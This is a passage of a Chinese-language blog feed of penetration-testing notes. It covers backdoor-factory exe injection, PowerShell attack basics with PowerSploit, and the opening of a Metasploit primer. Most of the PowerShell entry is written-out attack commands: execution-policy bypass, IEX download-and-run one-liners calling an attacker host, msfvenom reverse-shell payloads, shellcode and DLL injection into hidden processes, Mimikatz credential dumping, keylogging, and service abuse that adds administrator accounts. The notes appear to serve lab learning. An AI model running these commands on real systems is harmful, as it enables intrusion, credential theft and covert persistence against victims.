src="https://img-blog.csdnimg.cn/20210425103452519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>回车执行后，我们可以看到以下界面。这里要求我们选择 code cave ，提示我们要注入到那个区段，这里我就选择2注入到rsrc区段。<br><img src="https://img-blog.csdnimg.cn/20210425103632390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>生成成功。接下来在kali的msf中设置监听<br><img src="https://img-blog.csdnimg.cn/20210425103836947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>设置成功，运行，并将生成的exe文件扔到目标机中<br><img src="https://img-blog.csdnimg.cn/20210425104033582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将文件扔进靶机并运行<br><img src="https://img-blog.csdnimg.cn/20210425104124268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功拿到shell</p><p>这里只是我写的一个简单的笔记，想更深入了解的可以自行摸索，有错误还望指正</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>backdoor-factor</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>powershell基础知识</title>
    <link href="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<p>一旦攻击者可以在一台计算机上运行代码，就会下载powershell脚本文件(.ps1)到磁盘中 执行，甚至无需写到磁盘中执行，它可以直接在内存中运行，利用诸多特点攻击者可以持续攻击而不被轻易发现。</p><h4 id="常用的powershell攻击工具有以下几种："><a href="#常用的powershell攻击工具有以下几种：" class="headerlink" title="常用的powershell攻击工具有以下几种："></a>常用的powershell攻击工具有以下几种：</h4><ul><li><p>powerSploit:</p><p>常用于信息探测，权限提升，凭证窃取，持久化等操作</p></li><li><p>Nishang:</p><p>基于powershell的渗透测试专用工具，集成了框架，脚本和各种payload，包含下载和执行，键盘记录，DNS，延时命令等脚本</p></li><li><p>Empire:<br>基于powershell的远程控制木马，可以从凭证数据库中导出和跟踪凭证信息，常用于提供前期漏洞利用的集成模块，信息探测，凭证窃取，持久化控制。</p></li><li><p>powercat:<br>powershell版的Netcat,有着网络工具中的瑞士军刀美誉，他能通过tcp和udp在网络中读写数据，通过它和其他工具结合和重定向，读者可以在脚本中以多种方式使用它。</p></li></ul><h4 id="powershell优点："><a href="#powershell优点：" class="headerlink" title="powershell优点："></a>powershell优点：</h4><ul><li>windows7中默认安装了</li><li>powershell脚本可以运行在内存中，不需要写入磁盘</li><li>可以从另一个系统中下载powershell脚本并执行</li><li>目前很多工具都是基于powershell开发的</li><li>很多安全软件并不能检测到powershell的活动</li><li>cmd.exe通常会被阻止运行，但powershell不会</li><li>可以用来管理活动目录</li></ul><h5 id="查看版本：Get-Host"><a href="#查看版本：Get-Host" class="headerlink" title="查看版本：Get-Host"></a>查看版本：Get-Host</h5><p><img src="https://img-blog.csdnimg.cn/20210430172220730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="powershell的基本概念"><a href="#powershell的基本概念" class="headerlink" title="powershell的基本概念"></a>powershell的基本概念</h2><p>一个powershell脚本其实就是一个简单的文本文件，这个文件包含了一系列powershell命令，每个命令显示为独立的一行，对于被视为powershell脚本的文本文件，他的文件名需要加上.PS1的扩展名</p><h4 id="执行策略："><a href="#执行策略：" class="headerlink" title="执行策略："></a>执行策略：</h4><p>为防止恶意脚本的执行，powershell有一个执行策略，默认情况下，这个执行策略被设置为受限</p><p>在powershell脚本无法执行时，可以使用下面的cmdlet命令来确定当前的执行策略</p><h5 id="Get-ExecutionPolicy："><a href="#Get-ExecutionPolicy：" class="headerlink" title="Get-ExecutionPolicy："></a>Get-ExecutionPolicy：</h5><ul><li><p>Restricted:脚本不能执行(默认设置)<br><img src="https://img-blog.csdnimg.cn/20210430172234427.png" alt="在这里插入图片描述"></p></li><li><p>RemoteSigned</p><p>本地创建的脚本可以运行，但从网上下载的脚本不能运行(拥有数字证书签名的除外)</p></li><li><p>AllSigned</p><p>仅当脚本由受信任的发布者签名时才能运行</p></li><li><p>Unrestricted</p><p>允许所有的script运行</p></li></ul><h5 id="设置执行策略：-必须为管理员权限"><a href="#设置执行策略：-必须为管理员权限" class="headerlink" title="设置执行策略：(必须为管理员权限)"></a>设置执行策略：(必须为管理员权限)</h5><p>  Set-ExecutionPolicy  &lt; policy name &gt;<br>  <img src="https://img-blog.csdnimg.cn/2021043015291932.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210430152930635.png" alt="在这里插入图片描述"></p><h4 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h4><p>运行一个脚本，必须键入完整的路劲和文件名，例如，你要运行一个名为a.ps1的脚本，可以键入c:\script\a.ps1</p><h4 id="管道："><a href="#管道：" class="headerlink" title="管道："></a>管道：</h4><p>管道的作用就是将一个命令的输出作为另一个命令的输入，两个命令之间用管道符号(|)连接</p><p>例如：</p><p>假设停止所有目前运行中的，以”p”字符开头命名的程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pow">get-process p* | stop-process<br></code></pre></td></tr></table></figure><h2 id="powershell的常用命令："><a href="#powershell的常用命令：" class="headerlink" title="powershell的常用命令："></a>powershell的常用命令：</h2><h4 id="基础："><a href="#基础：" class="headerlink" title="基础："></a>基础：</h4><p>在powershell下，类似“cmd命令”叫做”cmdlet”</p><ul><li><p>新建目录&#x2F;文件</p><p>New-Item</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20210430153019493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>新建文件：<br><img src="https://img-blog.csdnimg.cn/20210430153034180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>删除目录</li></ul><p>Remove-Item<br><img src="https://img-blog.csdnimg.cn/20210430153107549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>显示文件内容</li></ul><p>Get-Content<br><img src="https://img-blog.csdnimg.cn/20210430153130243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>设置文件内容</li></ul><p>Set-Content<br><img src="https://img-blog.csdnimg.cn/20210430153159921.png" alt="在这里插入图片描述"></p><ul><li>追加内容</li></ul><p>Add-Content<br><img src="https://img-blog.csdnimg.cn/20210430153215415.png" alt="在这里插入图片描述"></p><ul><li>清除内容</li></ul><p>Clear-Content<br><img src="https://img-blog.csdnimg.cn/20210430153230800.png" alt="在这里插入图片描述"></p><h4 id="常用的命令："><a href="#常用的命令：" class="headerlink" title="常用的命令："></a>常用的命令：</h4><p>如果要运行powershell脚本程序，必须用管理员权限将Restricted策略改成Unrestricted,所以在渗透时，就需要采用一些方法绕过策略来执行脚本</p><ul><li><p>绕过本地权限执行</p><p>上传xxx.ps1至目标服务器，在cmd环境下，在目标服务器本地执行该脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pow">PowerShell.exe -ExecutionPolicy Bypass  -File  xxx.ps1<br></code></pre></td></tr></table></figure></li><li><p>本地隐藏绕过权限执行脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pow">PowerShell.exe -ExecutionPolicy Bypass  -WindowStyle Hidden  -NoLogo   -Nonlnteractive   -NoProfile  -File   xxx.ps1<br></code></pre></td></tr></table></figure></li><li><p>用IEX下载远程PS1脚本绕过权限执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs po">PowerShell.exe -ExecutionPolicy Bypass  -WindowStyle Hidden-NoProfile-NonIIEX(New-ObjectNet.WebClient).DownloadString(&quot;xxx.ps1&quot;);[Parameters]<br></code></pre></td></tr></table></figure></li></ul><h5 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h5><ul><li><p>-ExecutionPolicy Bypass </p><p>绕过执行安装策略，这个参数非常重要，在默认情况下，Powershell的安全策略规定了Powershell不允许运行命令和文件。通过设置这个参数，可以绕过一些安全保护规则，在渗透测试中，基本每一次运行powershell脚本都要使用这个参数</p></li><li><p>-WindowStyle Hidden </p><p>隐藏窗口</p></li><li><p>-NoLogo</p><p>启动不显示版权标志的Powershell</p></li><li><p>-Nonlnteractive( -Nonl)</p><p>非交互模式，powershell不为用户提供交互的提示</p></li><li><p>-NoProfile(-Nop)</p><p>powershell控制台不加载当前用户的配置文件</p></li><li><p>-Noexit</p><p>执行后不退出shell</p></li></ul><h4 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h4><p>‘“ test”‘&gt;t.ps1</p><p><img src="https://img-blog.csdnimg.cn/20210430153401145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit:"></a>PowerSploit:</h4><p>PowerSploit是一款基于Powershell的后渗透（post-Exploitation)框架软件，包含很多powershell攻击脚本，它们主要用户渗透中的信息侦察，权限提升，权限维持：</p><p>地址:    <a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><h5 id="模块功能介绍："><a href="#模块功能介绍：" class="headerlink" title="模块功能介绍："></a>模块功能介绍：</h5><ul><li><p>AntivirusBypass</p><p>发现杀毒软件的查杀特征</p></li><li><p>CodeExecution</p><p>在目标主机上执行代码</p></li><li><p>Exfiltration</p><p>在目标主机上的信息收集工具</p></li><li><p>Mayhem</p><p>蓝屏等破坏性脚本</p></li><li><p>Persistence</p><p>后门脚本(持久性控制)</p></li><li><p>Recon</p><p>以目标主机为跳板进行内网信息侦察</p></li><li><p>ScriptModification</p><p>在目标主机上创建或修改脚本</p></li></ul><h2 id="PowershellSploit脚本攻击实战"><a href="#PowershellSploit脚本攻击实战" class="headerlink" title="PowershellSploit脚本攻击实战"></a>PowershellSploit脚本攻击实战</h2><p>攻击机为kali并且安装了powershellsploit</p><ul><li><h3 id="Invoke-Shellcode"><a href="#Invoke-Shellcode" class="headerlink" title="Invoke-Shellcode"></a>Invoke-Shellcode</h3>CodeExecution模块下的Invoke-Shellcode脚本常用于将shellcode插入指定的进程ID或本地Powershell中</li></ul><h4 id="直接执行shellcoe反弹meterpreter-shell"><a href="#直接执行shellcoe反弹meterpreter-shell" class="headerlink" title="直接执行shellcoe反弹meterpreter  shell"></a>直接执行shellcoe反弹meterpreter  shell</h4><ol><li><p>首先在msf中使用reverse_https模块进行反弹(监听)</p><pre><code class="hljs">   2.使用msfvenom命令生成一个Powershell脚本木马</code></pre></li></ol>  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">msfvenom -p windows/meterpreter/reverse_https  LHOST=192.168.31.247  LPORT=4444  -f powershell  -o /var/www/html/test<br></code></pre></td></tr></table></figure><pre><code class="hljs">       3.接着在目标主机Powershell下输入以下命令下载该脚本(下载 invoke-shellcode)</code></pre>  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">      4.接着在目标主机上下载生成的木马</code></pre>  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/test&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">      5.在powershell中运行木马</code></pre>  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-Shellcode -Shellcode  （<span class="hljs-variable">$buf</span>） -Force<br></code></pre></td></tr></table></figure><pre><code class="hljs">          -Force   意思是不用提示直接运行</code></pre><p>  ​</p><p><img src="https://img-blog.csdnimg.cn/20210430163754518.png" alt="在这里插入图片描述"><br>反弹回shell<br><img src="https://img-blog.csdnimg.cn/20210430164544353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>​ </p><p>  可以在msf中看到反弹shell成功</p><h4 id="指定进程注入shellcode反弹meterpreter-shell"><a href="#指定进程注入shellcode反弹meterpreter-shell" class="headerlink" title="指定进程注入shellcode反弹meterpreter shell"></a>指定进程注入shellcode反弹meterpreter shell</h4><pre><code class="hljs">         1.同样在目标机powershell下输入以下命令</code></pre>  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;</span>)IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/test&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">          2.接着Get-Process命令或者PS命令查看当前进程              ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210430170657943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70)</code></pre><p>3.创建一个新进程，这里启动一个记事本，并把它设置为隐藏的，在输入Get-Process命令查看进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210430170805407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><p>4.接着输入命令，使用Invoke-Shellcode脚本进行注入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-Shellcode  -ProcessID  8120 -Shellcode(<span class="hljs-variable">$buf</span>)  -Force<br></code></pre></td></tr></table></figure><p>完成成功获取shell</p><ul><li><h3 id="Invoke-DLLInjection"><a href="#Invoke-DLLInjection" class="headerlink" title="Invoke-DLLInjection"></a>Invoke-DLLInjection</h3><p>下面使用Code Execution模块下的另一个脚本Invoke-DLLInjection，它是一个DLL注入的脚本</p><pre><code class="hljs">1.同理还是先下载脚本</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-DLLIinjection.ps1&quot;</span>)<br>IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/test&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs"> 2.在kali中生成一个DLL注入脚本</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.31.247  lport=4444  -f dll -o /var/www/html/test.dll<br></code></pre></td></tr></table></figure><pre><code class="hljs">   3.把生成的test.dll上传到目标服务器的C盘后，就能启动一个新的进程进行DLL注入，这样可以注入更加隐蔽，使用以下命令新建一个名为notepad.exe的隐藏进程</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Start-Process c:\windows\system32\notepad.exe-WindowStyle   Hidden<br></code></pre></td></tr></table></figure><pre><code class="hljs">    4.然后进行命令注入</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-DLLInjection  -ProcessID 2000 -DLL  c:\test.dll<br></code></pre></td></tr></table></figure><p>运行即可反弹shell</p></li></ul></li><li><h3 id="Invoke-Portscan"><a href="#Invoke-Portscan" class="headerlink" title="Invoke-Portscan"></a>Invoke-Portscan</h3><p>Invoke-Portscan是Recon模块下的一个脚本，主要用于端口扫描，使用起来比较简单。</p><pre><code class="hljs">                1.同样先使用以下命令下载脚本</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-Portscan.ps1&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">                2.使用以下命令进行扫描(目标机上)</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-Portscan  -Hosts 192.168.31.1.192.168.31.247 -Port <span class="hljs-string">&quot;80,22,3389&quot;</span><br></code></pre></td></tr></table></figure></li><li><h3 id="Invoke-Mimikatz"><a href="#Invoke-Mimikatz" class="headerlink" title="Invoke-Mimikatz"></a>Invoke-Mimikatz</h3><p>Invoke-Mimikatz是Exfiltration模块下的一个脚本</p><pre><code class="hljs">                    1.同样使用命令下载脚本</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-Mimikatz.ps1&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">                    下载即可                    2.执行命令</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-Mimikatz   -DumpCreds<br></code></pre></td></tr></table></figure></li></ul><h4 id="Get-Keystrokes"><a href="#Get-Keystrokes" class="headerlink" title="Get-Keystrokes:"></a>Get-Keystrokes:</h4><p>Get-Keystrokes是Exfiltration模块下的一个脚本，用于键盘记录，功能相当强大，不仅有键盘记录，甚至记录鼠标的点击情况，还能记录详细的时间，实战时可以直接放入后台运行。</p><p>同样先使用以下命令下载脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX(New-Object Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/Exfiltration/Get-Keystores.ps1&quot;</span>)<br></code></pre></td></tr></table></figure><p>使用以下命令开启键盘记录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Get-Keystrokes -LogPathc:\test1.txt<br></code></pre></td></tr></table></figure><h4 id="PowerUP攻击模块："><a href="#PowerUP攻击模块：" class="headerlink" title="PowerUP攻击模块："></a>PowerUP攻击模块：</h4><p>PowerUp是Privesc模块下的一个脚本，功能相当强大，拥有众多用来寻找目标主机windows服务漏洞进行提权的实用脚本。</p><p>加载模块：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">这里是本机所以直接导入<br>Import-Module  .\PowerUp.ps1<br><br>如要查看各个模块的详细说明，可以输入<br>get-help[cmdlet] -full<br>比如：<br>get-Help Invoke-ALLChecks   -full<br></code></pre></td></tr></table></figure><p>Invoke-ALLChecks:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">该模块会自动执行powerup下所以脚本啦检查目标主机，输出命令即可执行<br>Invoke-ALLChecks<br></code></pre></td></tr></table></figure><h4 id="Find-PathDLLHijack"><a href="#Find-PathDLLHijack" class="headerlink" title="Find-PathDLLHijack:"></a>Find-PathDLLHijack:</h4><p>该模块用于检查当前%PATH%的那些目录是用户可以写入的，输入以下命令即可执行该模块：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">Find</span>-Pathdllhijack<br></code></pre></td></tr></table></figure><h4 id="Get-RegistryAlwaysInstallElevated"><a href="#Get-RegistryAlwaysInstallElevated" class="headerlink" title="Get-RegistryAlwaysInstallElevated:"></a>Get-RegistryAlwaysInstallElevated:</h4><p>该模块用于检查AlwaysInstallElevated注册表项是否被设置，如果已被设置，意味着MSI文件以system权限运行的</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Get-RegistryAlwaysInstallElevated<br></code></pre></td></tr></table></figure><h4 id="Get-RegistryAutoLogon"><a href="#Get-RegistryAutoLogon" class="headerlink" title="Get-RegistryAutoLogon:"></a>Get-RegistryAutoLogon:</h4><p>该模块用于检查winlogin注册表的autoadminlogon项有没有被设置，可以查询默认的用户名和密码，执行该模块的命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Get-RegistryAutoLogon<br></code></pre></td></tr></table></figure><h4 id="Get-ServiceDetail"><a href="#Get-ServiceDetail" class="headerlink" title="Get-ServiceDetail:"></a>Get-ServiceDetail:</h4><p>该模块用于返回某服务的信息，输入以下命令即可执行该模块</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Get-ServiceDetail -ServiceName Dhcp                   <span class="hljs-comment">#获取DHCP服务的详细信息</span><br></code></pre></td></tr></table></figure><h4 id="Get-ServiceFilePermission"><a href="#Get-ServiceFilePermission" class="headerlink" title="Get-ServiceFilePermission:"></a>Get-ServiceFilePermission:</h4><p>该模块用于检查当前用户能够在那些服务的目录写入相关联的可执行文件，我们可以通过这些文件实现提权，输入以下命令即可执行该模块。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Get-ServiceFilePermission<br></code></pre></td></tr></table></figure><h4 id="Test-ServiceDaclPermission"><a href="#Test-ServiceDaclPermission" class="headerlink" title="Test-ServiceDaclPermission:"></a>Test-ServiceDaclPermission:</h4><p>该模块用于检查所有可用的服务，并尝试对这些打开的服务进行修改，如果可修改，则返回该服务对象：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Test-ServiceDaclPerssion<br></code></pre></td></tr></table></figure><h4 id="Invoke-ServiceAbuse"><a href="#Invoke-ServiceAbuse" class="headerlink" title="Invoke-ServiceAbuse:"></a>Invoke-ServiceAbuse:</h4><p>该模块通过修改服务来添加用户到指定组，并可以通过设置-cmd参数触发添加用户的自定义命令，执行该模块的命令。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-ServiceAbuse -ServiceName VulnSVC    <span class="hljs-comment">#添加默认账号</span><br>Invoke-ServiceAbuse -ServiceName VulnSVC   -UserName <span class="hljs-string">&quot;Test\john&quot;</span>     <span class="hljs-comment">#指定添加的域账户</span><br>Invoke-ServiceAbuse -ServiceName VulnSVC   -UserName <span class="hljs-built_in">test</span>  -Password  password  -LocalGroup  <span class="hljs-string">&quot;Administrators&quot;</span>     <span class="hljs-comment">#指定添加用户，用户密码以及添加的用户组</span><br>Invoke-ServiceAbuse -ServiceName VulnSVC   -Command <span class="hljs-string">&quot;net .......&quot;</span>         <span class="hljs-comment">#自定义执行命令</span><br></code></pre></td></tr></table></figure><h4 id="PowerUp攻击模块实战演练："><a href="#PowerUp攻击模块实战演练：" class="headerlink" title="PowerUp攻击模块实战演练："></a>PowerUp攻击模块实战演练：</h4><p>先加载PowerUp脚本，然后执行Invoke-ALLChecks，脚本将进行所有的检查</p><p>将powerup脚本上传至目标服务器，再从本地执行该脚本</p><p>使用IEX再内存中加载此脚本，执行以下命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">PowerShell.exe  -<span class="hljs-built_in">exec</span> bypass <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;C:\PowerUp.ps1&#x27;);Invoke-ALLChecks&quot;</span><br></code></pre></td></tr></table></figure><p>也可以再CMD环境下使用命令绕过执行该脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">powershell.exe  -<span class="hljs-built_in">exec</span> bypass -Command  <span class="hljs-string">&quot;&amp;&#123;Import-Module  .\PowerUp.ps1;  Invoke-ALLChecks&#125;&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>powershell基础知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>msf使用基础</title>
    <link href="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/"/>
    <url>/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>msf是后渗透神奇，在kali中已经内置有。</p><p><strong>1.1 基础使用</strong><br>metasploit程序需要使用postgresql数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">手动启动数据库：<br><br>service postgresql start<br><br>设置成开机启动数据库：<br><br>systemctl <span class="hljs-built_in">enable</span> postgresql<br></code></pre></td></tr></table></figure><p>启动msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br></code></pre></td></tr></table></figure><p><strong>1.2.查找模块</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">search 模块名<br>//比如我要找永恒之蓝 search ms17_010<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503215820762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" 